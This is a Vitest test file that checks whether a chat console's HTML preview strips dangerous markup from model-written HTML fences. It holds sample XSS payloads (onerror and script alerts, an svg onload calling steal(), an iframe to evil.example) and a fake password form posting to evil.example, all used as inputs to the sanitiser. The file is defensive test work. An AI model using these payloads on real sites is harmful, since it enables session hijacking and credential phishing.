/*
Copyright (C) 2025 QuantumNous

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.

For commercial licensing, please contact support@quantumnous.com
*/
import React from 'react';
import {
  describe,
  it,
  expect,
  vi,
  beforeAll,
  afterAll,
  afterEach,
} from 'vitest';
import { act, render } from '@testing-library/react';

/*
 * The Chat page renders a model-authored html fence as LIVE HTML: PreCode reads
 * the fence text and hands it to dangerouslySetInnerHTML. Whatever the
 * upstream model emits therefore runs in the operator session — and a model
 * repeating text a customer pasted into a prompt is a plain stored-XSS path
 * into the console, with no CSP behind it (security_headers.go sets none).
 *
 * helpers/sanitize.test.js pins that the sink NAMES a sanitiser. This file
 * pins the other half: that the rendered DOM really comes out inert.
 */

vi.mock('react-i18next', () => ({
  useTranslation: () => ({ t: (key) => key, i18n: { language: 'zh' } }),
  Trans: ({ children }) => children,
  initReactI18next: { type: '3rdParty', init: () => {} },
}));

// mermaid pulls a diagram engine (and canvas) at import time.
vi.mock('mermaid', () => ({
  default: { initialize: vi.fn(), run: vi.fn(() => Promise.resolve()) },
}));
vi.mock('remark-math', () => ({ default: () => () => {} }));
vi.mock('rehype-katex', () => ({ default: () => () => {} }));
vi.mock('rehype-highlight', () => ({ default: () => () => {} }));

vi.mock('../../../helpers', () => ({
  copy: vi.fn(() => Promise.resolve(true)),
  rehypeSplitWordsIntoSpans: () => () => {},
}));

vi.mock('@douyinfe/semi-icons', () => ({
  IconCopy: () => React.createElement('span', null, 'copy-icon'),
}));

vi.mock('@douyinfe/semi-ui', () => {
  const h = React.createElement;
  return {
    Button: ({ onClick, icon, children }) =>
      h('button', { type: 'button', onClick }, icon, children),
    Tooltip: ({ children }) => children,
    Toast: { success: vi.fn(), error: vi.fn() },
  };
});

import { PreCode } from './MarkdownRenderer';

// jsdom has no layout engine and therefore no innerText, which is what
// PreCode reads off the fence node. textContent is the right stand-in for a
// <code> block: no hidden nodes, no CSS.
let innerTextDescriptor;
beforeAll(() => {
  innerTextDescriptor = Object.getOwnPropertyDescriptor(
    HTMLElement.prototype,
    'innerText',
  );
  Object.defineProperty(HTMLElement.prototype, 'innerText', {
    configurable: true,
    get() {
      return this.textContent;
    },
  });
});

afterAll(() => {
  if (innerTextDescriptor) {
    Object.defineProperty(
      HTMLElement.prototype,
      'innerText',
      innerTextDescriptor,
    );
  } else {
    delete HTMLElement.prototype.innerText;
  }
});

afterEach(() => {
  vi.useRealTimers();
});

// PreCode schedules renderArtifacts through setTimeout(…, 1) and a 600ms
// debounce; both have to run before the preview exists.
//
// Assertions are scoped to the preview node, never to the whole container:
// the <pre> above it holds the fence SOURCE as escaped text, so a container-
// wide "does not contain onerror" would fail on inert text and pass for the
// wrong reason once it did pass.
const renderFence = async (source) => {
  vi.useFakeTimers({ shouldAdvanceTime: true });
  const { container } = render(
    <PreCode>
      <code className='language-html'>{source}</code>
    </PreCode>,
  );
  await act(async () => {
    vi.advanceTimersByTime(1000);
  });
  const box = container.lastElementChild;
  return { container, preview: box.lastElementChild };
};

describe('markdown html preview', () => {
  it('renders the preview at all (so the assertions below are not vacuous)', async () => {
    const { preview } = await renderFence('<p>hello preview</p>');
    expect(preview.querySelector('p')).not.toBeNull();
    expect(preview.textContent).toBe('hello preview');
  });

  it('drops an onerror handler from a model-authored html fence', async () => {
    const { preview } = await renderFence('<img src=x onerror=alert(1)>');

    const img = preview.querySelector('img');
    expect(img).not.toBeNull();
    expect(img.getAttribute('onerror')).toBeNull();
    expect(preview.innerHTML).not.toContain('onerror');
  });

  it('drops a script element from a model-authored html fence', async () => {
    const { preview } = await renderFence(
      '<div>safe</div><script>alert(1)</script>',
    );

    expect(preview.querySelector('script')).toBeNull();
    expect(preview.innerHTML).not.toContain('alert(1)');
    expect(preview.textContent).toContain('safe');
  });

  it('drops an iframe from a model-authored html fence', async () => {
    const { preview } = await renderFence(
      '<iframe src="https://evil.example"></iframe><b>kept</b>',
    );

    expect(preview.querySelector('iframe')).toBeNull();
    expect(preview.innerHTML).not.toContain('evil.example');
    expect(preview.querySelector('b')?.textContent).toBe('kept');
  });

  /*
   * The two halves of a credential-phishing overlay in the console origin.
   * Both survived DOMPurify's `html` profile until cycle 12's repair round —
   * the profile ALLOWS style/form/input/button, and FORBID_CONTENTS only
   * bites tags it does not allow — so these two cases fail on the tree as it
   * stood at the start of the round, with the sink already wrapped in
   * sanitizeHtml.
   */
  it('drops a style element, so a fence cannot restyle the console', async () => {
    const { preview } = await renderFence(
      '<p>copy</p><style>body{position:fixed;background:#000}</style>',
    );

    expect(preview.querySelector('style')).toBeNull();
    expect(preview.innerHTML).not.toContain('position:fixed');
    expect(preview.textContent).toContain('copy');
  });

  it('drops form controls, so a fence cannot paint a credential prompt', async () => {
    const { preview } = await renderFence(
      '<form action="https://evil.example"><input type="password" name="p">' +
        '<button>sign in</button></form>',
    );

    expect(preview.querySelector('form')).toBeNull();
    expect(preview.querySelector('input')).toBeNull();
    expect(preview.querySelector('button')).toBeNull();
    expect(preview.innerHTML).not.toContain('evil.example');
  });

  it('keeps an svg drawing, so a diagram fence is not an empty box', async () => {
    const { preview } = await renderFence(
      '<svg viewBox="0 0 10 10" onload="steal()"><circle cx="5" cy="5" r="4"></circle></svg>',
    );

    expect(preview.querySelector('svg')).not.toBeNull();
    expect(preview.querySelector('circle')).not.toBeNull();
    expect(preview.innerHTML).not.toContain('onload');
  });

  it('drops inline style attributes, so a fence cannot paint a full-page overlay', async () => {
    const { preview } = await renderFence(
      '<div style="position:fixed;inset:0;background:#fff;z-index:9999">over</div>',
    );

    expect(preview.innerHTML).not.toContain('position:fixed');
    expect(preview.textContent).toContain('over');
  });
});
